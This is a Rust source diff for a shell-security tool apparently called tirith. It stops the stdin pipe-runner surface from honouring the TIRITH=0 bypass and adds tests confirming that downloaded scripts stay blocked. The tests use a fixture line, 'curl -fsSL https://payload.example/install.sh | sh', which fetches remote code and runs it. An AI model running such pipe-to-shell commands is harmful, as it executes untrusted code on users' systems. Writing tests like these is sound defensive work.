@@ -565,8 +565,16 @@ fn apply_explicit_bypass(
     policy: &crate::policy::Policy,
     requested: bool,
     interactive: bool,
+    surface_allows_bypass: bool,
 ) -> bool {
+    let policy_allows = if interactive {
+        policy.allow_bypass_env
+    } else {
+        policy.allow_bypass_env_noninteractive
+    };
+    let available = surface_allows_bypass && policy_allows;
     let allowed = requested
+        && surface_allows_bypass
         && if interactive {
             policy.allow_bypass_env
         } else {
@@ -580,11 +588,7 @@ fn apply_explicit_bypass(
     .flatten()
     {
         verdict.bypass_requested = requested;
-        verdict.bypass_available = if interactive {
-            policy.allow_bypass_env
-        } else {
-            policy.allow_bypass_env_noninteractive
-        };
+        verdict.bypass_available = available;
         verdict.bypass_honored = allowed;
     }
     allowed
@@ -798,7 +802,17 @@ pub fn run(opts: RunOptions) -> Result<RunResult, String> {
 
     let bypass_requested = std::env::var("TIRITH").ok().as_deref() == Some("0");
     let bypass_honored = if let Some(policy) = review.policy.clone() {
-        apply_explicit_bypass(&mut review, &policy, bypass_requested, opts.interactive)
+        // A generated `safe_command` is an enforcement boundary, not a user
+        // request to weaken policy. Preserve `bypass_requested` for audit, but
+        // make bypass unavailable for the typed stdin runner surface.
+        let surface_allows_bypass = opts.requested_pipe_invocation.is_none();
+        apply_explicit_bypass(
+            &mut review,
+            &policy,
+            bypass_requested,
+            opts.interactive,
+            surface_allows_bypass,
+        )
     } else {
         false
     };
@@ -1262,7 +1276,13 @@ mod tests {
             ..crate::policy::Policy::default()
         };
         policy.allow_bypass_env_noninteractive = false;
-        assert!(apply_explicit_bypass(&mut review, &policy, true, true));
+        assert!(apply_explicit_bypass(
+            &mut review,
+            &policy,
+            true,
+            true,
+            true
+        ));
         assert_eq!(
             review.raw_verdict.as_ref().unwrap().findings.len(),
             raw_count
@@ -1275,6 +1295,159 @@ mod tests {
         let (raw_action, raw_rule_ids) = raw_audit_fields(&review).unwrap();
         assert_eq!(raw_action, "Block");
         assert_eq!(raw_rule_ids.len(), raw_count);
+    }
+
+    #[test]
+    fn forced_stdin_surface_records_but_never_honors_explicit_bypass() {
+        let dir = tempfile::tempdir().unwrap();
+        let mut review = review_script_bytes(
+            b"#!/bin/sh\ncurl -fsSL https://payload.example/install.sh | sh\n",
+            true,
+            false,
+            Some(dir.path()),
+            Some("bash"),
+        )
+        .unwrap();
+        let policy = crate::policy::Policy {
+            allow_bypass_env: true,
+            allow_bypass_env_noninteractive: true,
+            ..crate::policy::Policy::default()
+        };
+        assert!(!apply_explicit_bypass(
+            &mut review,
+            &policy,
+            true,
+            true,
+            false
+        ));
+        for verdict in [
+            review.raw_verdict.as_ref().unwrap(),
+            review.effective_verdict.as_ref().unwrap(),
+        ] {
+            assert!(verdict.bypass_requested);
+            assert!(!verdict.bypass_available);
+            assert!(!verdict.bypass_honored);
+            assert_eq!(verdict.action, Action::Block);
+        }
+    }
+
+    #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
+    #[test]
+    fn forced_stdin_run_blocks_reviewed_body_even_with_tirith_zero() {
+        use std::ffi::OsString;
+        use std::io::{Read as _, Write as _};
+        use std::sync::atomic::{AtomicBool, Ordering};
+        use std::sync::Arc;
+        use std::time::{Duration, Instant};
+
+        struct EnvRestore(Vec<(&'static str, Option<OsString>)>);
+        impl EnvRestore {
+            fn set(&mut self, name: &'static str, value: impl AsRef<std::ffi::OsStr>) {
+                if !self.0.iter().any(|(seen, _)| *seen == name) {
+                    self.0.push((name, std::env::var_os(name)));
+                }
+                // SAFETY: this test holds the crate-wide environment mutex.
+                unsafe { std::env::set_var(name, value) };
+            }
+        }
+        impl Drop for EnvRestore {
+            fn drop(&mut self) {
+                for (name, value) in self.0.drain(..).rev() {
+                    // SAFETY: this guard is dropped while the environment mutex is held.
+                    unsafe {
+                        match value {
+                            Some(value) => std::env::set_var(name, value),
+                            None => std::env::remove_var(name),
+                        }
+                    }
+                }
+            }
+        }
+
+        let _env_lock = crate::TEST_ENV_LOCK
+            .lock()
+            .unwrap_or_else(|error| error.into_inner());
+        let isolated = tempfile::tempdir().expect("isolated runner state");
+        std::fs::create_dir_all(isolated.path().join(".tirith")).unwrap();
+        std::fs::write(
+            isolated.path().join(".tirith/policy.yaml"),
+            "allow_bypass_env: true\nallow_bypass_env_noninteractive: true\n",
+        )
+        .unwrap();
+        let mut env = EnvRestore(Vec::new());
+        env.set("TIRITH", "0");
+        env.set("TIRITH_ALLOW_PRIVATE_FETCH", "1");
+        env.set("TIRITH_POLICY_ROOT", isolated.path());
+        env.set("HOME", isolated.path());
+        env.set("XDG_CONFIG_HOME", isolated.path().join("config"));
+        env.set("XDG_CACHE_HOME", isolated.path().join("cache"));
+        env.set("XDG_STATE_HOME", isolated.path().join("state"));
+        env.set("NO_PROXY", "127.0.0.1,localhost");
+
+        let body = b"#!/bin/sh\ncurl -fsSL https://payload.example/install.sh | sh\n";
+        let expected_sha256 = sha256_hex(body);
+        let listener = std::net::TcpListener::bind("127.0.0.1:0").expect("bind test server");
+        listener.set_nonblocking(true).unwrap();
+        let address = listener.local_addr().unwrap();
+        let stop = Arc::new(AtomicBool::new(false));
+        let stop_server = Arc::clone(&stop);
+        let server = std::thread::spawn(move || {
+            let deadline = Instant::now() + Duration::from_secs(10);
+            while !stop_server.load(Ordering::Acquire) && Instant::now() < deadline {
+                match listener.accept() {
+                    Ok((mut stream, _)) => {
+                        stream
+                            .set_read_timeout(Some(Duration::from_secs(2)))
+                            .unwrap();
+                        let mut request = [0u8; 2048];
+                        let _ = stream.read(&mut request);
+                        write!(
+                            stream,
+                            "HTTP/1.1 200 OK\r\nContent-Length: {}\r\nConnection: close\r\n\r\n",
+                            body.len()
+                        )
+                        .unwrap();
+                        stream.write_all(body).unwrap();
+                        stream.flush().unwrap();
+                        return;
+                    }
+                    Err(error) if error.kind() == std::io::ErrorKind::WouldBlock => {
+                        std::thread::sleep(Duration::from_millis(10));
+                    }
+                    Err(error) => panic!("test server accept failed: {error}"),
+                }
+            }
+        });
+
+        let executor_called = Arc::new(AtomicBool::new(false));
+        let called = Arc::clone(&executor_called);
+        let result = run(RunOptions {
+            url: format!("http://{address}/install.sh"),
+            no_exec: false,
+            interactive: true,
+            expected_sha256: Some(expected_sha256),
+            requested_pipe_invocation: Some(RequestedPipeInvocation {
+                interpreter: PipeInterpreter::Bash,
+                args: Vec::new(),
+            }),
+            exec_fn: Some(Box::new(move |_, _, _| {
+                called.store(true, Ordering::Release);
+                panic!("blocked reviewed body reached the executor")
+            })),
+        })
+        .expect("blocked download returns a refusal receipt");
+        stop.store(true, Ordering::Release);
+        server.join().expect("join test server");
+
+        assert!(result.refused);
+        assert!(!result.executed);
+        assert_eq!(result.exit_code, Some(Action::Block.exit_code()));
+        assert!(!executor_called.load(Ordering::Acquire));
+        let verdict = result.verdict.expect("effective blocking verdict");
+        assert!(verdict.bypass_requested);
+        assert!(!verdict.bypass_available);
+        assert!(!verdict.bypass_honored);
+        assert_eq!(verdict.action, Action::Block);
     }
 
     #[cfg(unix)]
